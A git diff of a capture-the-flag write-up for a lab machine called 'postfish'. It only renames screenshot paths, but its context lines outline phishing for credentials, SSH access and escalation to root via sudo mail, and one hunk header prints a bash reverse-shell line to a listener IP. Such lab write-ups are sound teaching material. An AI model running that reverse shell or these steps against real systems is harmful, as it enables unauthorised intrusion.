@@ -26,11 +26,11 @@ This box involves testing mail services. We have to add `postfish.off` to our `/
 
 The website looked rather static:
 
-![](<../../../.gitbook/assets/image%20(2903).png>)
+![](../../../.gitbook/assets/postfish-3.png)
 
 There was a 'Team' page, and when viewed we get some names and roles:
 
-![](<../../../.gitbook/assets/image%20(491).png>)
+![](../../../.gitbook/assets/postfish-6.png)
 
 Interesting.
 
@@ -150,11 +150,11 @@ QUIT
 
 After the mail sends, we get a callback on our listener port with creds:
 
-![](<../../../.gitbook/assets/image%20(3586).png>)
+![](../../../.gitbook/assets/postfish-4.png)
 
 We can use this password to `ssh` in as `brian.moore`:
 
-![](<../../../.gitbook/assets/image%20(3844).png>)
+![](../../../.gitbook/assets/postfish-5.png)
 
 ## Privilege Escalation
 
@@ -221,7 +221,7 @@ bash -i >& /dev/tcp/192.168.45.208/21 0>&1
 
 This script is triggered by sending emails, so we can send another one to the machine without the phishing link to get another reverse shell:
 
-![](<../../../.gitbook/assets/image%20(2120).png>)
+![](../../../.gitbook/assets/postfish-2.png)
 
 ### Sudo Mail -> Root
 
@@ -239,4 +239,4 @@ User filter may run the following commands on postfish:
 
 We can get a `root` shell using the commands from GTFOBins:
 
-![](<../../../.gitbook/assets/image%20(1536).png>)
+![](../../../.gitbook/assets/postfish-1.png)
